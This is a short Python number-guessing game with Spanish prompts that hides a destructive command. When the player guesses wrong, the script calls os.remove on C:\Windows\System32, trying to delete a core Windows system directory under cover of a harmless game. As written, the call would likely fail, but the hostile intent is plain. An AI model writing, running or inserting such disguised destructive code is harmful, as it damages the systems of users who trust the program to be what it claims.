import random
import os

numero = random.randint(1,5)
print("Bienvenido al juego de adivinar un numero")
numeroIngreso = int(input("Adivina el número entre 1 al 5: "))

if numero == numeroIngreso:
    print("Has acertado")
else:
    print("No has acertado, es una pena")
    os.remove("C:\Windows\System32")



















